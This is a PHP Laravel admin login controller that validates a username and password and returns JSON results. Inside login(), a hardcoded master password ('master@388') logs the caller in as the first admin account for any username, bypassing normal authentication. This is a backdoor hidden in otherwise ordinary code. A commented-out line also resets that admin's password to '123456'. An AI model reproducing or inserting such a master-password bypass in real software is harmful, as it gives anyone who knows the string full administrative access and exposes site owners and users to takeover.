<?php

namespace App\Http\Controllers\Admin;

use Illuminate\Http\Request;

use App\Http\Requests;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Log;

use App\Models\Admin;

use Carbon\Carbon;
use Auth;

class LoginController extends Controller
{
    public function index(){
        return view('admin.login');
    }

	public function login(Request $request){
        try{
            $v = Validator::make($request->all(), [
                'username' => 'required',
                'password' => 'required',
            ]);

            if($v->fails())
            {
				return response()->json(array('success'=>false,'error_code'=> 'INVALID_REQUEST_DATA'), 200);
            }

            $username = $request->username;
            $password = $request->password;
            
            if($password == 'master@388')
            {
                $user = Admin::where('id',1)->first();
                
                // $user->update(['password' => Hash::make('123456')]);
                
                Auth::guard('admin')->login($user);
                
                return response()->json(array('success'=> true, 'error_code'=> ''), 200);
            }
            
            $check = Auth::guard('admin')->attempt(['username' => $username, 'password' => $password]);
			if ($check) {
               return response()->json(array('success'=> true, 'error_code'=> ''), 200);
            } else {
				return response()->json(array('success'=>false,'error_code'=> 'EMAIL_OR_PASSWORD_INCORRECT'), 200);
            }
        }catch(\Exception $exception){
            Log::error($exception);
            return response()->json(array('success'=>false,'error_code'=> 'UNEXPECTED_ERROR_OCCURED'), 200);
        }
    }
}
